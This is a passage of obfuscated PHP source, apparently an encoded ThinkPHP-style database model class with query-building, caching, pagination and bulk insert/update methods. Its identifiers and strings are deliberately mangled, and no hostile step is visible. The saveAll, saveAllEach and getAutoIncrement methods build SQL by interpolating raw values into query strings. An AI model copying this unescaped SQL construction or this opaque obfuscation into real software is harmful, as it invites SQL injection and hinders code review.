$this->options[$‰­î‡Õ[376]][$‰­î‡Õ[377]] = !0; } if (is_object($‘©œª¸œ)) { $‘©œª¸œ = get_object_vars($‘©œª¸œ); } if (is_string($‘©œª¸œ)) { $¢Šé£Äú = $‘©œª¸œ; } elseif (is_array($‘©œª¸œ)) { if (isset($‘©œª¸œ[0])) { $this->options[$‰­î‡Õ[376]] = array_merge($this->options[$‰­î‡Õ[376]], $‘©œª¸œ); return $this; } else { $¢Šé£Äú = $‘©œª¸œ; } } else { think_exception(think_lang($‰­î‡Õ[300])); } $this->options[$‰­î‡Õ[376]][] = $¢Šé£Äú; return $this; } public function cache($‰ÂÓòş = true, $…ì§‘ü = null, $ÜÏ¹®Â = '') { $õ‚ß¯ëÂ =& $_SERVER[¡“ËÌ§œ]; if (!1 !== $‰ÂÓòş) { $this->options[$õ‚ß¯ëÂ[378]] = array($õ‚ß¯ëÂ[94] => $‰ÂÓòş, $õ‚ß¯ëÂ[368] => $…ì§‘ü, $õ‚ß¯ëÂ[33] => $ÜÏ¹®Â); } return $this; } public function field($Ú­„ú»Ù, $‡ëºë¯¢ = false) { $·Ö»¥ôÔ =& $_SERVER[¡“ËÌ§œ]; if (!0 === $Ú­„ú»Ù) { $¹†®¿Š± = $this->getDbFields(); $Ú­„ú»Ù = $¹†®¿Š± ? $¹†®¿Š± : $·Ö»¥ôÔ[189]; } elseif ($‡ëºë¯¢) { if (is_string($Ú­„ú»Ù)) { $Ú­„ú»Ù = explode($·Ö»¥ôÔ[50], $Ú­„ú»Ù); } $¹†®¿Š± = $this->getDbFields(); $Ú­„ú»Ù = $¹†®¿Š± ? array_diff($¹†®¿Š±, $Ú­„ú»Ù) : $Ú­„ú»Ù; } $this->options[$·Ö»¥ôÔ[302]] = $Ú­„ú»Ù; return $this; } public function scope($Ê ­Œí× = '', $¯ôı·ì = NULL) { $æÛ¹åÌ® =& $_SERVER[¡“ËÌ§œ]; if ($æÛ¹åÌ®[12] === $Ê ­Œí×) { if (isset($this->_scope[$æÛ¹åÌ®[37]])) { $—èøÉ¥Ÿ = $this->_scope[$æÛ¹åÌ®[37]]; } else { return $this; } } elseif (is_string($Ê ­Œí×)) { $Ÿ“€‹À = explode($æÛ¹åÌ®[50], $Ê ­Œí×); $—èøÉ¥Ÿ = array(); foreach ($Ÿ“€‹À as $‰öêùÏŞ) { if (!isset($this->_scope[$‰öêùÏŞ])) { continue; } $—èøÉ¥Ÿ = array_merge($—èøÉ¥Ÿ, $this->_scope[$‰öêùÏŞ]); } if (!empty($¯ôı·ì) && is_array($¯ôı·ì)) { $—èøÉ¥Ÿ = array_merge($—èøÉ¥Ÿ, $¯ôı·ì); } } elseif (is_array($Ê ­Œí×)) { $—èøÉ¥Ÿ = $Ê ­Œí×; } if (is_array($—èøÉ¥Ÿ) && !empty($—èøÉ¥Ÿ)) { $this->options = array_merge($this->options, array_change_key_case($—èøÉ¥Ÿ)); } return $this; } public function where($´¡ôÃÒƒ, $ëöáØû = null) { $“ÇÌ¼¬¡ =& $_SERVER[¡“ËÌ§œ]; if (!is_null($ëöáØû) && is_string($´¡ôÃÒƒ)) { if (!is_array($ëöáØû)) { $ëöáØû = func_get_args(); array_shift($ëöáØû); } $ëöáØû = array_map(array($this->db, $“ÇÌ¼¬¡[372]), $ëöáØû); $´¡ôÃÒƒ = vsprintf($´¡ôÃÒƒ, $ëöáØû); } elseif (is_object($´¡ôÃÒƒ)) { $´¡ôÃÒƒ = get_object_vars($´¡ôÃÒƒ); } elseif (is_array($´¡ôÃÒƒ)) { foreach ($´¡ôÃÒƒ as $â ò¢ïÖ => $÷şæ“éè) { if ((is_numeric($â ò¢ïÖ) || !$â ò¢ïÖ) && is_string($÷şæ“éè)) { if (strpos($÷şæ“éè, $“ÇÌ¼¬¡[379]) === 0) { continue; } think_trace($“ÇÌ¼¬¡[380], $“ÇÌ¼¬¡[12], $“ÇÌ¼¬¡[49]); die; } } } if (is_string($´¡ôÃÒƒ) && $“ÇÌ¼¬¡[12] != $´¡ôÃÒƒ) { $¹Ş÷ÊËÈ = array(); $¹Ş÷ÊËÈ[$“ÇÌ¼¬¡[381]] = $´¡ôÃÒƒ; $´¡ôÃÒƒ = $¹Ş÷ÊËÈ; } if (isset($this->options[$“ÇÌ¼¬¡[304]])) { $this->options[$“ÇÌ¼¬¡[304]] = array_merge($this->options[$“ÇÌ¼¬¡[304]], $´¡ôÃÒƒ); } else { $this->options[$“ÇÌ¼¬¡[304]] = $´¡ôÃÒƒ; } return $this; } public function limit($ƒŒ¸÷¿, $Ì ÇÒáá = null) { $‹ñú“ªÈ =& $_SERVER[¡“ËÌ§œ]; $this->options[$‹ñú“ªÈ[321]] = is_null($Ì ÇÒáá) ? $ƒŒ¸÷¿ : $ƒŒ¸÷¿ . $‹ñú“ªÈ[50] . $Ì ÇÒáá; return $this; } public function page($ˆšø‹û§, $óÄ±Ä‹„ = null) { $÷æ¶è¿ =& $_SERVER[¡“ËÌ§œ]; $this->options[$÷æ¶è¿[382]] = is_null($óÄ±Ä‹„) ? $ˆšø‹û§ : $ˆšø‹û§ . $÷æ¶è¿[50] . $óÄ±Ä‹„; return $this; } public function comment($öÇôîÕÊ) { $this->options[$_SERVER[¡“ËÌ§œ][383]] = $öÇôîÕÊ; return $this; } public function setProperty($»Ë¤¤…½, $˜³íå“) { if (property_exists($this, $»Ë¤¤…½)) { $this->{$»Ë¤¤…½} = $˜³íå“; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\x69\146\171\x54\x69\155\x65", "\164\x69\155\145", "\x69\156\x73\x65\x72\x74\54\165\x70\144\x61\164\145", "\146\x75\156\x63\x74\151\157\x6e"), array("\143\162\x65\141\x74\x65\x54\x69\x6d\x65", "\164\x69\155\x65", "\151\156\x73\x65\x72\x74", "\146\165\x6e\143\x74\x69\157\x6e")); public function setDataAuto($ç½œÑ‡³) { $this->dataAuto = $ç½œÑ‡³; } public function __construct($ßé¡¶Ò = '', $×ª¨–ú­ = '', $ªèƒ·»ã = '') { parent::__construct($ßé¡¶Ò, $×ª¨–ú­, $ªèƒ·»ã); } protected $tableMeta = array(); protected function _beforeInsert(&$É›à‰È¤, $¥ÕŸÜÕµ) { $¬Ú÷ ‚¡ =& $_SERVER[¡“ËÌ§œ]; if (!$this->checkDataAutoHas($¬Ú÷ ‚¡[384])) { return; } $this->dataBeforeFilter($É›à‰È¤, $¬Ú÷ ‚¡[384]); } protected function _beforeUpdate(&$µœ€…óÖ, $®òºçâú) { $äÂ¡£ôŒ =& $_SERVER[¡“ËÌ§œ]; if (!$this->checkDataAutoHas($äÂ¡£ôŒ[385])) { return; } $this->dataBeforeFilter($µœ€…óÖ, $äÂ¡£ôŒ[385]); } protected function _afterSelect(&$Ä¹¦ŒÙù, $ò½ş–Éñ) { if (!is_array($Ä¹¦ŒÙù)) { return; } if (!$this->checkDataAutoHas($_SERVER[¡“ËÌ§œ][386])) { return; } foreach ($Ä¹¦ŒÙù as &$ËØÒãª¸) { $this->dataAfterFilter($ËØÒãª¸); } unset($ËØÒãª¸); } protected function _afterFind(&$ÎÛ–ú¢Í, $„‹öÍŠÏ) { if (!is_array($ÎÛ–ú¢Í)) { return; } if (!$this->checkDataAutoHas($_SERVER[¡“ËÌ§œ][386])) { return; } $this->dataAfterFilter($ÎÛ–ú¢Í); } public static function textEncode($Ó²Çàë) { if (!$Ó²Çàë) { return $Ó²Çàë; } $Å¥ÁÂ…­ = json_encode($Ó²Çàë); $Å¥ÁÂ…­ = preg_replace_callback($_SERVER[¡“ËÌ§œ][387], function ($¢´ö€£«) { return addslashes($¢´ö€£«[0]); }, $Å¥ÁÂ…­); return json_decode($Å¥ÁÂ…­); } public static function textDecode($úğû‹©) { $÷À¤Î½² =& $_SERVER[¡“ËÌ§œ]; $Ìîú–Ô† = json_encode($úğû‹©); $Ìîú–Ô† = preg_replace_callback($÷À¤Î½²[388], function ($˜ã¬Ûó›) { return $_SERVER[¡“ËÌ§œ][97]; }, $Ìîú–Ô†); return json_decode($Ìîú–Ô†); } public function setAutoIncrement($êİº¬üÊ) { $…œ«¦®É = array($this->getPk() => $êİº¬üÊ); $ÓÀšÑ„ = $this->data($…œ«¦®É)->add(); if ($ÓÀšÑ„) { $this->delete($ÓÀšÑ„); } } public function getAutoIncrement() { $ñ¥ÕğÜ = $this->getTableName(); $çƒ“ˆ®É = $this->max($this->getPk()); $É¤¡¡¾ = $this->query("\x73\150\157\167\40\x74\x61\142\x6c\145\x20\163\164\141\x74\x75\163\40\x77\150\x65\x72\x65\x20\x4e\x61\x6d\x65\75\x27{$ñ¥ÕğÜ}\x27"); $íºğÑçÈ = $É¤¡¡¾[0][$_SERVER[¡“ËÌ§œ][389]]; $¥ƒ¾´¥ò = max($çƒ“ˆ®É, $íºğÑçÈ); return $¥ƒ¾´¥ò; } protected function _callBefore($ÁÆ’¦š¾, $Ú«ŒóœÕ) { return $this->cacheCallCheck($ÁÆ’¦š¾, $Ú«ŒóœÕ, !1); } protected function _callAfter($¸¡Ì¥òŸ, $˜Âç¼è©) { return $this->cacheCallCheck($¸¡Ì¥òŸ, $˜Âç¼è©, !0); } protected function cacheFunctionAlias($ÀÓÑóŒº) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ãà´èÜ, $Î Âú‘Å, $§É—İßÁ = false) { $Ïï¡ºŠê = $this->cacheFunctionAlias($Î Âú‘Å); if (!$Ïï¡ºŠê) { return; } foreach ($Ïï¡ºŠê as $¨¨·Ó => $Ñ§Œ×½È) { $ôª¿¿öÙ = $Ñ§Œ×½È[0]; $ÚÊ­Ç¾¥ = explode($_SERVER[¡“ËÌ§œ][50], $Ñ§Œ×½È[1]); if ($ãà´èÜ == $¨¨·Ó) { return $this->cacheFunctionGet($¨¨·Ó, $ôª¿¿öÙ); } if ($§É—İßÁ && in_array($ãà´èÜ, $ÚÊ­Ç¾¥)) { $this->cacheFunctionClear($¨¨·Ó, $ôª¿¿öÙ); } } } public function cacheFunctionGet($ÜÌİœğŒ, $ò«ğÛíŠ) { $¹ğ¹ˆøí = $this->cacheKeyMake($ÜÌİœğŒ, $ò«ğÛíŠ); $²®€ö ª = Cache::get($¹ğ¹ˆøí); if (!is_array($²®€ö ª)) { $²®€ö ª = call_user_func_array(array($this, $ÜÌİœğŒ), array($ò«ğÛíŠ, !0)); Cache::set($¹ğ¹ˆøí, $²®€ö ª); } return $²®€ö ª; } public function cacheFunctionClear($æ¹ñ†ûª, $‘š±†¤é) { $öµŒóí = $‘š±†¤é; if (!is_array($‘š±†¤é)) { $öµŒóí = array($‘š±†¤é); } foreach ($öµŒóí as $ÔŸ¢Ñ‡ë) { $ı›‡üÚÜ = $this->cacheKeyMake($æ¹ñ†ûª, $ÔŸ¢Ñ‡ë); Cache::remove($ı›‡üÚÜ); } } private function cacheKeyMake($ì©İüÜõ, $ù¤ó½˜Å) { $ŸİÅ¼¿² =& $_SERVER[¡“ËÌ§œ]; return get_class($this) . $ŸİÅ¼¿²[11] . $ì©İüÜõ . $ŸİÅ¼¿²[390] . $ù¤ó½˜Å; } protected function selectPageReset() { $îşñÏ‘Ş =& $_SERVER[¡“ËÌ§œ]; if (isset($GLOBALS[$îşñÏ‘Ş[391]])) { return; } $GLOBALS[$îşñÏ‘Ş[391]] = isset($GLOBALS[$îşñÏ‘Ş[7]][$îşñÏ‘Ş[392]]) ? $GLOBALS[$îşñÏ‘Ş[7]][$îşñÏ‘Ş[392]] : !1; $GLOBALS[$îşñÏ‘Ş[393]] = isset($GLOBALS[$îşñÏ‘Ş[7]][$îşñÏ‘Ş[382]]) ? $GLOBALS[$îşñÏ‘Ş[7]][$îşñÏ‘Ş[382]] : !1; $GLOBALS[$îşñÏ‘Ş[7]][$îşñÏ‘Ş[392]] = !1; $GLOBALS[$îşñÏ‘Ş[7]][$îşñÏ‘Ş[382]] = !1; } protected function selectPageRestore() { $ôŸ¨·Š“ =& $_SERVER[¡“ËÌ§œ]; if (!isset($GLOBALS[$ôŸ¨·Š“[391]])) { return; } $GLOBALS[$ôŸ¨·Š“[7]][$ôŸ¨·Š“[392]] = $GLOBALS[$ôŸ¨·Š“[391]]; $GLOBALS[$ôŸ¨·Š“[7]][$ôŸ¨·Š“[382]] = $GLOBALS[$ôŸ¨·Š“[393]]; if ($GLOBALS[$ôŸ¨·Š“[7]][$ôŸ¨·Š“[392]] === !1) { unset($GLOBALS[$ôŸ¨·Š“[7]][$ôŸ¨·Š“[392]]); } if ($GLOBALS[$ôŸ¨·Š“[7]][$ôŸ¨·Š“[382]] === !1) { unset($GLOBALS[$ôŸ¨·Š“[7]][$ôŸ¨·Š“[382]]); } unset($GLOBALS[$ôŸ¨·Š“[391]]); unset($GLOBALS[$ôŸ¨·Š“[393]]); } protected function selectPage($¯—ğ¶« = 200, $¬†éÏ˜’ = 1) { $ßàÚÃ÷¾ =& $_SERVER[¡“ËÌ§œ]; global $in; $­‘ê˜Í¿ = $this->optionsValue(); $š£èÀ®æ = 50000; $¯—ğ¶« = isset($in[$ßàÚÃ÷¾[392]]) && $in[$ßàÚÃ÷¾[392]] ? $in[$ßàÚÃ÷¾[392]] : $¯—ğ¶«; if ($¯—ğ¶« === -1) { $in[$ßàÚÃ÷¾[392]] = !1; $š£èÀ®æ = 100000000; $¯—ğ¶« = $š£èÀ®æ; } $ƒ®®¡ò° = $­‘ê˜Í¿; $ƒ®®¡ò°[$ßàÚÃ÷¾[394]] = array(); $¯—ğ¶« = intval($¯—ğ¶«); $¯—ğ¶« = $¯—ğ¶« <= 5 ? 5 : ($¯—ğ¶« >= $š£èÀ®æ ? $š£èÀ®æ : $¯—ğ¶«); $¬†éÏ˜’ = intval(isset($in[$ßàÚÃ÷¾[382]]) && $in[$ßàÚÃ÷¾[382]] ? $in[$ßàÚÃ÷¾[382]] : $¬†éÏ˜’); $¬†éÏ˜’ = $¬†éÏ˜’ <= 1 ? 1 : $¬†éÏ˜’; $£ÛÖü‹è = array(); $·ØÙĞ˜³ = 1; if ($¬†éÏ˜’ == 1 && $·ØÙĞ˜³) { $this->optionsValue($­‘ê˜Í¿); $£ÛÖü‹è = $this->page($¬†éÏ˜’, $¯—ğ¶«)->select(); $­·Æ»²í = is_array($£ÛÖü‹è) ? count($£ÛÖü‹è) : 0; if ($­·Æ»²í < $¯—ğ¶«) { $ØèÌ†€ = 1; } else { $this->optionsValue($ƒ®®¡ò°); $­·Æ»²í = intval($this->count()); $ØèÌ†€ = ceil($­·Æ»²í / $¯—ğ¶«); } } else { $this->optionsValue($ƒ®®¡ò°); $­·Æ»²í = intval($this->count()); $ØèÌ†€ = ceil($­·Æ»²í / $¯—ğ¶«); $¬†éÏ˜’ = $¬†éÏ˜’ >= $ØèÌ†€ ? $ØèÌ†€ : $¬†éÏ˜’; $this->optionsValue($­‘ê˜Í¿); $£ÛÖü‹è = $this->page($¬†éÏ˜’, $¯—ğ¶«)->select(); } if (!is_array($£ÛÖü‹è)) { $£ÛÖü‹è = array(); } if ($ØèÌ†€ == 1) { $­·Æ»²í = count($£ÛÖü‹è); } $åŠ¸Ú†Ğ = array($ßàÚÃ÷¾[395] => array($ßàÚÃ÷¾[396] => $­·Æ»²í, $ßàÚÃ÷¾[392] => $¯—ğ¶«, $ßàÚÃ÷¾[382] => $¬†éÏ˜’, $ßàÚÃ÷¾[397] => $ØèÌ†€), $ßàÚÃ÷¾[398] => $£ÛÖü‹è); return $åŠ¸Ú†Ğ; } protected function checkLength($º¡Ò¤ø€, $ÒøŞò˜– = 0, $ğı´ÚØ = '') { $Í–²¡ñş =& $_SERVER[¡“ËÌ§œ]; $ÒøŞò˜– = $ÒøŞò˜– ? $ÒøŞò˜– : 65536; if (!$º¡Ò¤ø€ || strlen($º¡Ò¤ø€) < $ÒøŞò˜–) { return; } $ğı´ÚØ = $ğı´ÚØ ? $ğı´ÚØ . $Í–²¡ñş[71] : $Í–²¡ñş[12]; show_json($ğı´ÚØ . LNG($Í–²¡ñş[399]) . "\x28{$ÒøŞò˜–}\x29", !1); } protected function metaSet($É¸à©¿, $—±æ¹ø = null, $Şèø‰Êó = null) { $èÀ…«£€ =& $_SERVER[¡“ËÌ§œ]; if (!$this->tableMeta || !$É¸à©¿) { return !1; } $¨æ½¯°Ş = $this->tableMeta[$èÀ…«£€[400]]; $’’ˆÈ¹³ = $this->tableMeta[$èÀ…«£€[401]]; $˜¦ùĞ’Í = Model($’’ˆÈ¹³); $½Ú•ü ñ = array($¨æ½¯°Ş => $É¸à©¿, $èÀ…«£€[402] => $—±æ¹ø); if (is_null($—±æ¹ø)) { return $˜¦ùĞ’Í->where(array($¨æ½¯°Ş => $É¸à©¿))->delete(); } if (is_null($Şèø‰Êó) && is_string($—±æ¹ø)) { return $˜¦ùĞ’Í->where($½Ú•ü ñ)->delete(); } $áôßšŞ = is_array($—±æ¹ø) ? $—±æ¹ø : array(); if (is_string($—±æ¹ø)) { $áôßšŞ[$—±æ¹ø] = $Şèø‰Êó; } $ŠÜµÂˆç = array(); foreach ($áôßšŞ as $¬™™×Œ¼ => $Ã²ç«¡ä) { if (is_null($Ã²ç«¡ä) && is_string($¬™™×Œ¼)) { $˜¦ùĞ’Í->where(array($¨æ½¯°Ş => $É¸à©¿, $èÀ…«£€[402] => $¬™™×Œ¼))->delete(); continue; } $this->checkLength($Ã²ç«¡ä, !1, $’’ˆÈ¹³ . $èÀ…«£€[4] . $¬™™×Œ¼); $ŠÜµÂˆç[] = array($¨æ½¯°Ş => $É¸à©¿, $èÀ…«£€[94] => $¬™™×Œ¼, $èÀ…«£€[403] => $Ã²ç«¡ä); } $×Íº Ş = $èÀ…«£€[404] . $’’ˆÈ¹³; CacheLock::lock($×Íº Ş); $˜¦ùĞ’Í->where(array($¨æ½¯°Ş => $É¸à©¿))->addAll($ŠÜµÂˆç, array(), !0); CacheLock::unlock($×Íº Ş); return !0; } public function metaGet($Õ‹¨¹´³, $™ÒÑß‰ó = false) { $¡ÓğšÒç =& $_SERVER[¡“ËÌ§œ]; if (!$this->tableMeta) { return array(); } $°Óƒüùæ = $this->tableMeta[$¡ÓğšÒç[400]]; $Å·¾µâÎ = Model($this->tableMeta[$¡ÓğšÒç[401]]); if ($™ÒÑß‰ó) { $‘ÑîóêŸ = array($°Óƒüùæ => $Õ‹¨¹´³, $¡ÓğšÒç[94] => $™ÒÑß‰ó); return $Å·¾µâÎ->where($‘ÑîóêŸ)->getField($¡ÓğšÒç[403]); } $‘ÑîóêŸ = array($°Óƒüùæ => $Õ‹¨¹´³); $Á³ï¤–ş = $Å·¾µâÎ->field($¡ÓğšÒç[405])->where($‘ÑîóêŸ)->select(); $Á³ï¤–ş = array_to_keyvalue($Á³ï¤–ş, $¡ÓğšÒç[94], $¡ÓğšÒç[403]); return $Á³ï¤–ş; } private function checkDataAutoHas($÷ÂöÊ¦õ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $óÇÒÂ•ü) { if (in_array($÷ÂöÊ¦õ, explode($_SERVER[¡“ËÌ§œ][50], $óÇÒÂ•ü[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$‘ÙÓ–¼ç, $Ç¼§µä) { $â¥ õŸÊ =& $_SERVER[¡“ËÌ§œ]; if (!is_array($‘ÙÓ–¼ç)) { return; } foreach ($this->dataAuto as $î»¢¦¬) { $«ıø€¦Ú = $î»¢¦¬[0]; if (!in_array($Ç¼§µä, explode($â¥ õŸÊ[50], $î»¢¦¬[2]))) { continue; } switch (trim($î»¢¦¬[3])) { case $â¥ õŸÊ[350]: case $â¥ õŸÊ[351]: $½œˆ–»Æ = $î»¢¦¬[1]; $ÆûöŒÁ = isset($î»¢¦¬[4]) ? (array) $î»¢¦¬[4] : array(); if ($½œˆ–»Æ == $â¥ õŸÊ[180] && array_key_exists($«ıø€¦Ú, $‘ÙÓ–¼ç)) { if (!$‘ÙÓ–¼ç[$«ıø€¦Ú]) { unset($‘ÙÓ–¼ç[$«ıø€¦Ú]); } break; } if (isset($‘ÙÓ–¼ç[$«ıø€¦Ú])) { array_unshift($ÆûöŒÁ, $‘ÙÓ–¼ç[$«ıø€¦Ú]); } if ($â¥ õŸÊ[350] == $î»¢¦¬[3]) { $‘ÙÓ–¼ç[$«ıø€¦Ú] = call_user_func_array($½œˆ–»Æ, $ÆûöŒÁ); } else { $‘ÙÓ–¼ç[$«ıø€¦Ú] = call_user_func_array(array(&$this, $½œˆ–»Æ), $ÆûöŒÁ); } break; case $â¥ õŸÊ[299]: if (isset($‘ÙÓ–¼ç[$«ıø€¦Ú]) && $‘ÙÓ–¼ç[$«ıø€¦Ú]) { $‘ÙÓ–¼ç[$«ıø€¦Ú] = call_user_func_array(array(&$this, $î»¢¦¬[1]), array($‘ÙÓ–¼ç[$«ıø€¦Ú])); } break; case $â¥ õŸÊ[302]: $‘ÙÓ–¼ç[$«ıø€¦Ú] = $‘ÙÓ–¼ç[$î»¢¦¬[1]]; break; case $â¥ õŸÊ[323]: if (isset($‘ÙÓ–¼ç[$«ıø€¦Ú]) && !is_string($‘ÙÓ–¼ç[$«ıø€¦Ú])) { $‘ÙÓ–¼ç[$«ıø€¦Ú] = json_encode_force($‘ÙÓ–¼ç[$«ıø€¦Ú]); } break; case $â¥ õŸÊ[352]: if ($‘ÙÓ–¼ç[$«ıø€¦Ú] === $â¥ õŸÊ[12]) { unset($‘ÙÓ–¼ç[$«ıø€¦Ú]); } break; case $â¥ õŸÊ[353]: $‘ÙÓ–¼ç[$«ıø€¦Ú] = $î»¢¦¬[1]; default: break; } } if ($Ç¼§µä == $â¥ õŸÊ[384]) { $ı·é­•· = strtolower($this->db->getDbType()); if (strpos($ı·é­•·, $â¥ õŸÊ[13]) !== 0) { return; } $Ùºõ¦ğ¬ = $this->field(!0)->fields; $åõ™É¸¶ = $Ùºõ¦ğ¬[$â¥ õŸÊ[281]]; if (isset($Ùºõ¦ğ¬[$â¥ õŸÊ[280]])) { unset($åõ™É¸¶[$Ùºõ¦ğ¬[$â¥ õŸÊ[280]]]); } foreach ($åõ™É¸¶ as $¾Í©ØŸ¨ => $Ç¼§µä) { if (!isset($‘ÙÓ–¼ç[$¾Í©ØŸ¨])) { $‘ÙÓ–¼ç[$¾Í©ØŸ¨] = $â¥ õŸÊ[12]; } } } } private function dataAfterFilter(&$ÃÏ¼üœ¢) { $ª¤¤—ô¿ =& $_SERVER[¡“ËÌ§œ]; foreach ($this->dataAuto as $Ü¿õê•õ) { $ü¥ÕÀıà = $Ü¿õê•õ[0]; if (!isset($ÃÏ¼üœ¢[$ü¥ÕÀıà])) { continue; } if (!in_array($ª¤¤—ô¿[386], explode($ª¤¤—ô¿[50], $Ü¿õê•õ[2]))) { continue; } switch (trim($Ü¿õê•õ[3])) { case $ª¤¤—ô¿[350]: case $ª¤¤—ô¿[351]: $¤Â¹Ä€ò = isset($Ü¿õê•õ[4]) ? (array) $Ü¿õê•õ[4] : array(); array_unshift($¤Â¹Ä€ò, $ÃÏ¼üœ¢[$ü¥ÕÀıà]); if (isset($Ü¿õê•õ[4]) && $Ü¿õê•õ[4] == $ª¤¤—ô¿[406]) { $¤Â¹Ä€ò = array($ÃÏ¼üœ¢[$ü¥ÕÀıà]); } if ($ª¤¤—ô¿[350] == $Ü¿õê•õ[3]) { $ÃÏ¼üœ¢[$ü¥ÕÀıà] = call_user_func_array($Ü¿õê•õ[1], $¤Â¹Ä€ò); } else { $ÃÏ¼üœ¢[$ü¥ÕÀıà] = call_user_func_array(array(&$this, $Ü¿õê•õ[1]), $¤Â¹Ä€ò); } break; case $ª¤¤—ô¿[299]: if (isset($ÃÏ¼üœ¢[$ü¥ÕÀıà]) && $ÃÏ¼üœ¢[$ü¥ÕÀıà]) { $ÃÏ¼üœ¢[$ü¥ÕÀıà] = call_user_func_array(array(&$this, $Ü¿õê•õ[1]), array($ÃÏ¼üœ¢[$ü¥ÕÀıà])); } break; case $ª¤¤—ô¿[302]: $ÃÏ¼üœ¢[$ü¥ÕÀıà] = $ÃÏ¼üœ¢[$Ü¿õê•õ[1]]; break; case $ª¤¤—ô¿[323]: $øöÌ§Ö… = $ÃÏ¼üœ¢[$ü¥ÕÀıà]; $ÃÏ¼üœ¢[$ü¥ÕÀıà] = json_decode($øöÌ§Ö…, !0); if (is_null($ÃÏ¼üœ¢[$ü¥ÕÀıà])) { $ÃÏ¼üœ¢[$ü¥ÕÀıà] = $øöÌ§Ö…; } break; case $ª¤¤—ô¿[352]: if ($ÃÏ¼üœ¢[$ü¥ÕÀıà] === $ª¤¤—ô¿[12]) { unset($ÃÏ¼üœ¢[$ü¥ÕÀıà]); } break; case $ª¤¤—ô¿[353]: $ÃÏ¼üœ¢[$ü¥ÕÀıà] = $Ü¿õê•õ[1]; break; default: break; } } } public function saveAll($Şô’—â) { $¶òÊ¬ÒÚ =& $_SERVER[¡“ËÌ§œ]; $ ›¤˜•‰ = $this->tablePrefix . $this->tableName; $äÖØÎ¢ = self::SQL_WHERE_IN_CHUNK; $Şô’—â = is_array($Şô’—â) ? $Şô’—â : array(); $´²áûÜø = $¶òÊ¬ÒÚ[407]; $·ùÎ®ı = 0; $®ÍÂÈÃ® = array(); $úéÖÔö = count($Şô’—â); for ($§¸·öæ = 0; $§¸·öæ < $úéÖÔö; $§¸·öæ++) { $Ø©ƒ†ÕË = $Şô’—â[$§¸·öæ]; if (!is_array($Ø©ƒ†ÕË) || count($Ø©ƒ†ÕË) != 4) { continue; } $ÚØ¡¡‰Œ = "\x55\x50\104\x41\124\105\40\x60{$ ›¤˜•‰}\140\40\123\105\x54\x20{$Ø©ƒ†ÕË[2]}\40\x3d\40\103\x41\x53\105\40{$Ø©ƒ†ÕË[0]}\40\xa"; if ($·ùÎ®ı == 0) { $´²áûÜø = $ÚØ¡¡‰Œ; } $®ÍÂÈÃ®[] = $¶òÊ¬ÒÚ[118] . $Ø©ƒ†ÕË[1] . $¶òÊ¬ÒÚ[118]; $·ùÎ®ı++; $´²áûÜø .= "\x20\x57\x48\x45\116\40\47{$Ø©ƒ†ÕË[1]}\47\40\124\x48\105\116\40\47{$Ø©ƒ†ÕË[3]}\x27\x20\xa"; if ($·ùÎ®ı == $äÖØÎ¢ || $§¸·öæ == $úéÖÔö - 1) { $ÙÒºñºİ = implode($¶òÊ¬ÒÚ[50], $®ÍÂÈÃ®); $´²áûÜø .= "\40\105\116\x44\x20\40\127\x48\x45\122\x45\40{$Ø©ƒ†ÕË[0]}\x20\111\x4e\40\50{$ÙÒºñºİ}\51\40"; $this->execute($´²áûÜø); $·ùÎ®ı = 0; $´²áûÜø = $ÚØ¡¡‰Œ; $this->chunkEventCheck(count($®ÍÂÈÃ®)); $®ÍÂÈÃ® = array(); } } $this->chunkEventSet(); } public function saveAllEach($¤·åÄ×) { $ùŞÔ×ç =& $_SERVER[¡“ËÌ§œ]; $ ñ‰æäå = $this->tablePrefix . $this->tableName; foreach ($¤·åÄ× as $‘Æ²È ) { if (!is_array($‘Æ²È ) || count($‘Æ²È ) != 4) { continue; } $ ğ™ô€ã = $‘Æ²È [0] . $ùŞÔ×ç[408] . $‘Æ²È [1] . $ùŞÔ×ç[118]; $…ëÒí…Ú = $‘Æ²È [2] . $ùŞÔ×ç[408] . $‘Æ²È [3] . $ùŞÔ×ç[118]; $Öæâì¤ê = "\x75\x70\x64\141\164\x65\40{$ ñ‰æäå}\40\163\x65\164\x20{$…ëÒí…Ú}\x20\167\150\x65\162\x65\40{$ ğ™ô€ã}\73"; $this->execute($Öæâì¤ê); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ŒáîÍ– = false, $İ±Í˜ = false) { $this->_chunkEvent = $ŒáîÍ–; $this->_chunkEventParam = $İ±Í˜; } private function chunkEventCheck($õèì‰×Ë) { if (!$this->_chunkEvent) { return; } $Ú¶È² = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Ú¶È²[$_SERVER[¡“ËÌ§œ][409]] = $õèì‰×Ë; Hook::trigger($this->_chunkEvent, $Ú¶È²); } public function addAll($¤›®êö, $…ÅÏÕ°Ï = array(), $º©¹¢ÖË = false) { $¹ÉæĞİÑ =& $_SERVER[¡“ËÌ§œ]; ignore_timeout(); $¹úâşèŞ = self::SQL_WHERE_IN_CHUNK; if (empty($¤›®êö)) { $this->error = think_lang($¹ÉæĞİÑ[300]); return !1; } $…ÅÏÕ°Ï = $this->_parseOptions($…ÅÏÕ°Ï); foreach ($¤›®êö as $Ñ€ÑØ© => $ß»µ¿Ü¤) { $¤›®êö[$Ñ€ÑØ©] = $this->_facade($ß»µ¿Ü¤); $this->_beforeInsert($¤›®êö[$Ñ€ÑØ©], $…ÅÏÕ°Ï); } if (method_exists($this->db, $¹ÉæĞİÑ[301])) { for ($‘ÒÀœÎš = 0; $‘ÒÀœÎš < count($¤›®êö); $‘ÒÀœÎš += $¹úâşèŞ) { $Ä¹İƒµ« = array_slice($¤›®êö, $‘ÒÀœÎš, $¹úâşèŞ); if (!is_array($Ä¹İƒµ«) || count($Ä¹İƒµ«) == 0) { break; } $¾•Íªíì = $this->db->insertAll($Ä¹İƒµ«, $…ÅÏÕ°Ï, $º©¹¢ÖË); $this->chunkEventCheck(count($Ä¹İƒµ«)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¤›®êö as $Ñ€ÑØ© => $ß»µ¿Ü¤) { $¾•Íªíì = $this->db->insert($ß»µ¿Ü¤, $…ÅÏÕ°Ï, $º©¹¢ÖË); } $this->commit(); } if (!1 !== $¾•Íªíì) { $Í¹æ‡“Ù = $this->getLastInsID(); if ($Í¹æ‡“Ù) { return $Í¹æ‡“Ù; } } return 